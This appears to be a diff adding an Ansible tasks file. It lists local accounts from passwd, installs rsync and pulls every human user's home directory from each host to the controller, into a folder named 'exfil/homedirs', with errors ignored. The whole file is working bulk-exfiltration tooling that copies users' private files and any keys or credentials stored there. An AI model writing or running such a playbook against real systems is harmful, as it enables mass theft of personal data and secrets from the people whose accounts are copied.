@@ -1,0 +1,22 @@
+---
+- name: Get all local users from passwd
+  ansible.builtin.getent:
+    database: passwd
+
+- name: Install Common Packages
+  package:
+    name: rsync
+    state: present
+
+- name: Pull home directories to controller
+  ansible.posix.synchronize:
+    mode: pull
+    src: "{{ item.value[4] }}/"
+    dest: "./exfil/homedirs/{{ inventory_hostname }}_{{ item.key }}/"
+    recursive: yes
+  loop: "{{ getent_passwd | dict2items }}"
+  # Filter for human users (UID >= 1000) and skip system service accounts
+  when: 
+    - item.value[1] | int >= 1000
+    - item.key != "nobody"
+  ignore_errors: yes
